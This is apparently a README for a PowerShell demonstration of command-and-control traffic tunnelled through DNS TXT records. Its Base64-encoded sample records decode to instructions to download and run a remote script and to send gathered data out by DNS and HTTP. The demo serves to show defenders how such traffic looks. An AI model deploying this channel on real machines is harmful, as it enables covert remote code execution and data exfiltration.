# DNS C2 Demo

This set of scripts will help you to demostrate how easy it is to run C2-traffic thru DNS

The script ***demo-create-txt-records.ps1*** creates Base64 encoded records that can be used as TXT-entries

Something like this:

```
;QUESTION
c2demo.ronnkvist.nu. IN TXT
;ANSWER
c2demo.ronnkvist.nu. 3600 IN TXT "cmlybzsyO1BTO2RlbW8tcmVtb3RlLXNjcmlwdC5wczE="
c2demo.ronnkvist.nu. 3600 IN TXT "cmlybzszO1NldDtjMmRlbW9zZXJ2ZXIucm9ubmt2aXN0Lm51"
c2demo.ronnkvist.nu. 3600 IN TXT "cmlybzs0O2h0dHA7ZGVtby1wdXNoLW91dC50eHQ="
c2demo.ronnkvist.nu. 3600 IN TXT "cmlybzswO1dyaXRlO1RpbWUgdG8gZG8gc29tZSBDMi1zdHVmZiA7KQ=="
c2demo.ronnkvist.nu. 3600 IN TXT "cmlybzsxO0dldDtodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vcmlyb2ZhbC9ETlMtQzItRGVtby9tYWluL2RlbW8tcmVtb3RlLXNjcmlwdC5wczE="
c2demo.ronnkvist.nu. 3600 IN TXT "cmlybzs1O0ROUztkZW1vLXB1c2gtb3V0LnR4dA=="
```

Then you have the script ***demo-c2-client.ps1*** that you can run on a Windows client with Powershell and access to a DNS.

The script will use TXT-records to find and download another script, execute it and show how a simple DNS-query would send out the information gathered.

### Example output from Demo C2 Client
![Example Output](./demo-c2-client-output.png?raw=true)


### Showing C2 traffic using DNS-queries

[DNSChef](https://github.com/iphelix/dnschef) can be used for a lot of fun DNS-stuff but in this example just to showcase the DNS-queries used as C2 traffic.

You can change the DNS-settings on your client or just use the parameter ***$demoC2DnsServer*** and point it to your DNSChef

```
.\demo-c2-client.ps1 -demoC2DnsServer  "192.168.100.156"
```

![Example Output](./demo-c2-client-dnschef.png?raw=true)


### Showing outgoing HTTP-post

A [small Python http server](https://gist.github.com/mdonkers/63e115cc0c79b4f6b8b3a6b797e485c7) can be used to see the HTTP-traffic

![Example Output](./demo-c2-client-webserver.png?raw=true)
